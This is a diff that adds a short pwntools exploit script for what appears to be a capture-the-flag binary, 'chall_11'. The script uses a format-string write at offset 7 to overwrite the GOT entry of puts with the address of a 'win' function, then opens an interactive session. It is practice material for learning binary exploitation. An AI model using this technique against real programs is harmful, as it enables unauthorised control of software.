@@ -22,3 +22,26 @@ Vulns:
 
 # Import Libaries
 from pwn import *
+
+# Set up ELF
+elf = ELF("./chall_11")
+
+# Finding Offset (Found at ? with tons of %p)
+offset = 7
+
+# What to write, going to write address of win pretty much over GOT of puts
+what = elf.sym.win
+
+# Target == puts, since called after gets
+target = elf.got.puts
+
+# Start a process and send payload
+p = process("./chall_11")
+payload = fmtstr_payload(offset,{target:what})
+p.sendline(payload)
+
+# Recieve up till nulls to send line
+null = payload.find(b'\x00')
+p.recvuntil(payload[null-3:null])   # Catch all nulls
+
+p.interactive()
